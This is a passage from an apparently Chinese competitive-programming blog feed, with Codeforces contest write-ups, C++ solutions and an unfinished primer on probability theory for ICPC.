class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">60</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_bit</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&amp;<span class="number">1</span>)&#123;</span><br><span class="line">            a[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        x&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,k;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(a));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        cin&gt;&gt;x;</span><br><span class="line">        <span class="built_in">get_bit</span>(x);</span><br><span class="line">        <span class="comment">//puts(&quot;1&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">30</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(k&gt;=n-a[i])&#123;</span><br><span class="line">            k-=n-a[i];</span><br><span class="line">            ans|=(<span class="number">1</span>&lt;&lt;i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一次在cf上ak，也算成功吧，虽然都挺简单的hhh。</p><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/9.png" alt="9"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天来打个&lt;a href=&quot;https://codeforces.com/contest/1669&quot;&gt;div4&lt;/a&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="签到" scheme="http://example.com/categories/icpc/codeforces/%E7%AD%BE%E5%88%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>codeforces round 783(Div.2)解析</title>
    <link href="http://example.com/2022/04/20/Codeforces%20Round%20783(Div.2)/"/>
    <id>http://example.com/2022/04/20/Codeforces%20Round%20783(Div.2)/</id>
    <published>2022-04-19T16:00:00.000Z</published>
    <updated>2022-04-21T06:14:28.181Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1668">Codeforces Round #783 (Div. 2)</a></p><span id="more"></span><h2 id="A-Direction-Change"><a href="#A-Direction-Change" class="headerlink" title="A. Direction Change"></a>A. Direction Change</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/20/Codeforces%20Round%20783(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>不难发现，我最优的路线只能是向右或者向下走。我先不妨设 $m\ge n$，如果走到底了，不得以我只能向上转变方向然后再右下，这样循环走直到终点，只考虑到了最后一行的情况，不难发现，每次长度+1变为奇数时，走的步数+1，否则+3。最后特判一下走不了的情况，当只有一行且有超过2列的情况为走不了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">if</span>(n&gt;m)&#123;<span class="comment">//m&gt;n</span></span><br><span class="line">        <span class="built_in">swap</span>(n,m);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>&amp;&amp;m&gt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    ans+=<span class="number">2</span>*n<span class="number">-2</span>;</span><br><span class="line">    m-=n;</span><br><span class="line">    <span class="keyword">if</span>(m==<span class="number">0</span>)&#123;</span><br><span class="line">        ans+=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(m%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            ans+=<span class="number">2</span>*m;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            ans+=<span class="number">2</span>*m<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">     </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Social-Distance"><a href="#B-Social-Distance" class="headerlink" title="B.Social Distance"></a>B.Social Distance</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/20/Codeforces%20Round%20783(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>n个人要做在m把椅子上，每个人对自己有要求，要求左右两边必须有一定数目把空椅子。这个交错两发，后面发现这些人不是按顺序坐的，可以随意排，那么不难发现我们可以对要求从小到大排序然后相邻之间的要求取max最后取和得到一个值与m比较即可。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1000006</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[<span class="number">1</span>]+<span class="number">1</span>&gt;m)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n);</span><br><span class="line">    </span><br><span class="line">    a[<span class="number">0</span>]=a[n];</span><br><span class="line">    <span class="keyword">int</span> ans=n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=<span class="built_in">max</span>(a[i],a[i<span class="number">-1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ans&lt;=m)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,ans);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Make-it-Increasing"><a href="#C-Make-it-Increasing" class="headerlink" title="C. Make it Increasing"></a>C. Make it Increasing</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/20/Codeforces%20Round%20783(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>给定一个初始值全为0的数组，每个位置可以固定加或减一定的值，要求序列严格递增，求最少操作次数。对于这个问题只需要抓住一个重点：那就是谁为0，根据给定的 $n&lt;5000$ 基本可以判断出来这个要 $O(n^2)$ 的算法。我们只需要循环把一个数强制设置为0，然后0往左边递减，往右边递增，这里我也可以往左边递增，因为减去和加上差不多的嘛，我加上让它递增和减去让它递减是差不多的。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">5005</span>];</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">5005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0x7fffffffffffffff</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;<span class="comment">//zero</span></span><br><span class="line">        <span class="built_in">memset</span>(b,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(b));</span><br><span class="line">        <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i<span class="number">-1</span>;j&gt;=<span class="number">1</span>;j--)&#123;</span><br><span class="line">            <span class="keyword">int</span> k=<span class="built_in">ceil</span>((<span class="keyword">double</span>)(b[j+<span class="number">1</span>]+<span class="number">1</span>)/a[j]);</span><br><span class="line">            ans+=k;</span><br><span class="line">            b[j]=k*a[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            <span class="keyword">int</span> k=<span class="built_in">ceil</span>((<span class="keyword">double</span>)(b[j<span class="number">-1</span>]+<span class="number">1</span>)/a[j]);</span><br><span class="line">            ans+=k;</span><br><span class="line">            b[j]=k*a[j];</span><br><span class="line">        &#125;</span><br><span class="line">        res=<span class="built_in">min</span>(res,ans);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,res);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当时也有点没注意到就是数值可能很大，大到超过int，当时初值我只给了0x7fffffff就wa了一发。</p><p>这场比赛失误了很多吧，不过最后还得感谢大自然的馈赠，写了一个明显有问题的程序让我hack了，没至于让我掉太多分。</p><p><img src="/2022/04/20/Codeforces%20Round%20783(Div.2)/4.png" alt="4"></p><p>继续加油吧，上分之路还很漫长。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://codeforces.com/contest/1668&quot;&gt;Codeforces Round #783 (Div. 2)&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="思维" scheme="http://example.com/categories/icpc/codeforces/%E6%80%9D%E7%BB%B4/"/>
    
    
  </entry>
  
  <entry>
    <title>概率论在icpc的应用</title>
    <link href="http://example.com/2022/04/18/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9C%A8icpc%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <id>http://example.com/2022/04/18/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9C%A8icpc%E7%9A%84%E5%BA%94%E7%94%A8/</id>
    <published>2022-04-18T03:00:00.000Z</published>
    <updated>2022-04-22T14:30:11.626Z</updated>
    
    <content type="html"><![CDATA[<p>昆明打铁之后，痛定思痛，来重修概率论了。</p><span id="more"></span><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="样本空间、事件和概率"><a href="#样本空间、事件和概率" class="headerlink" title="样本空间、事件和概率"></a>样本空间、事件和概率</h2><p><strong>样本空间</strong> S 是一个集合，它的元素称为<strong>基本事件</strong>。样本空间的一个子集被称为事件， 根据定义，所有基本事件<strong>互斥</strong>。</p><p><strong>互斥事件</strong>：若事件 A 发生<strong>一定</strong>能推导出 B 不发生，B 发生<strong>一定</strong>能推导出A不发生，则称 A，B 互斥，不难得出，两个事件同时发生的概率为 0，至少发生其中一个事件的概率为两者概率之和（概率公理3）。这个理论可以推导到 n 个事件，若有 n 个<strong>两两互斥</strong>事件 $a_1,a_2…a_n$，则任意两个事件同时发生的概率为 0，任意发生一个事件的概率就为 $\sum _{i=1}^n a_i$ 。</p><p><strong>概率公理</strong>：</p><ol><li>对于任意事件 A，事件发生的概率满足 $0\le P{A}\le1$</li><li>对于样本空间 S，有$P{S}=1$</li><li>对于两个互斥事件 A，B，有 $P{A∪B}=P{A}+P{B}$</li></ol><h2 id="随机变量"><a href="#随机变量" class="headerlink" title="随机变量"></a>随机变量</h2><p>如果对样本空间 S 中的任意事件 e，都有<strong>唯一</strong>的实数 <strong>X(e)</strong> 与之对应，则称 <strong>X=X(e)</strong> 为样 本空间 S 上的随机变量。这个随机变量怎么理解呢，首先看下面这张图：</p><p><img src="/2022/04/18/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%9C%A8icpc%E7%9A%84%E5%BA%94%E7%94%A8/1.png" alt="1"></p><p>还不能理解的话，就举个栗子，如果掷一个骰子，那么它的样本空间为 **{1,2,3,4,5,6}**，把它一次掷骰子出的点数作为一个随机变量的话，那么很    容易得到映射 X 就是一个普通的 $X(e)=e$，或者说，随机变量为样本点 e 的函数，以样本点为自变量，确定一个对应关系得到的应变量就是一个随机变量。</p><p>其中<strong>离散型随机变量</strong>和<strong>连续型随机变量</strong>比较常见。</p><h3 id="离散型随机变量及其概率分布"><a href="#离散型随机变量及其概率分布" class="headerlink" title="离散型随机变量及其概率分布"></a>离散型随机变量及其概率分布</h3><p>离散型随机变量取值范围为<strong>有限可数</strong>或者<strong>无限可数</strong>，或者说取值范围不在实数范围内连续。设离散型随机变量 X 的取值为 $\text{x}_i$ 时的概率为 $p_i(i=1,2…)$，则称 X 的所有取值及其概率为随机变量 X 的概率分布。离散型变量常见的分布有两点分布，二项分布，几何分布，超几何分布，泊松分布。</p><h3 id="连续性随机变量及其概率分布"><a href="#连续性随机变量及其概率分布" class="headerlink" title="连续性随机变量及其概率分布"></a>连续性随机变量及其概率分布</h3><p>如果 X 是在实数域或区间上<strong>取连续值</strong>的随机变量，设 X 的概率分布函数为 $F(x)=P{X\le x}$，若存在非负可积函数 $f(x)$，使得对任意的 x，有 $F(x)=\int _{-∞}^{x}f(t)dt$，则称 X 为连续随机变量，称 $f(x)$ 为 X 的<strong>概率密度函数</strong>。常见的连续性随机变量分布有均匀分布，正态分布，指数分布。</p><p>概率密度函数的几何意义：随机变量的取值落在某个区域之内的概率为概率密度函数在这个区域上的积分。当概率密度函数存在的时候，累积分布函数是概率密度函数的积分，对概率密度函数作傅里叶变换可得特征函数。</p><p>在数学中，连续型随机变量的概率密度函数（在不至于混淆时可以简称为密度函数）是一个描述这个随机变量的输出值，在某个确定的取值点附近的可能性的函数。而随机变量的取值落在某个区域之内的概率则为概率密度函数在这个区域上的积分。当概率密度函数存在的时候，累积分布函数是概率密度函数的积分。</p><h4 id="连续型随机向量及其概率分布"><a href="#连续型随机向量及其概率分布" class="headerlink" title="连续型随机向量及其概率分布"></a>连续型随机向量及其概率分布</h4><p>待更新</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;昆明打铁之后，痛定思痛，来重修概率论了。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="数学" scheme="http://example.com/categories/icpc/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="概率论" scheme="http://example.com/categories/icpc/%E6%95%B0%E5%AD%A6/%E6%A6%82%E7%8E%87%E8%AE%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>codeforces round 782(div2)解析</title>
    <link href="http://example.com/2022/04/18/Codeforces%20Round%20782(Div.2)/"/>
    <id>http://example.com/2022/04/18/Codeforces%20Round%20782(Div.2)/</id>
    <published>2022-04-17T16:01:00.000Z</published>
    <updated>2022-05-06T07:24:47.906Z</updated>
    
    <content type="html"><![CDATA[<p>还是很开心的，第一次CF打出来D题，嘎嘎上132分，目前1584分，紫名指日可待。</p><span id="more"></span><h2 id="A-Red-Versus-Blue"><a href="#A-Red-Versus-Blue" class="headerlink" title="A.Red Versus Blue"></a>A.Red Versus Blue</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/04/18/Codeforces%20Round%20782(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>知道双方赢球场次，要求构造一个输赢序列使得总比赛中最大连赢场数最小，即给定两种字符及个数，输出一个字符串使得由相同字符构成的子串最短。</p><p>首先题目给定了B的数目严格小于R，那么最优的情况一定是一输一赢，考虑在 b 个 B 中插入R，容易得到总共有 b+1 个可以插入的位置。若 r 可以整除 b+1，则可以得出答案为 r/(b+1)，若否，则得到 r/(b+1)+1。</p><p>我们先在b+1个位置中每个放上 r/(b+1) 个 R，剩下r%(b+1)个R则随便给，只要不要一个位置给两次就可以了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,r,b;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;r&gt;&gt;b;</span><br><span class="line">    <span class="keyword">int</span> k=r/(b+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> res=r%(b+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=b;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=k;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;R&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(res)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;R&quot;</span>);</span><br><span class="line">            res--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;B&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=k;j++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;R&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(res)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;R&quot;</span>);</span><br><span class="line">        res--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Bit-Flipping"><a href="#B-Bit-Flipping" class="headerlink" title="B. Bit Flipping"></a>B. Bit Flipping</h2><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/04/18/Codeforces%20Round%20782(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" 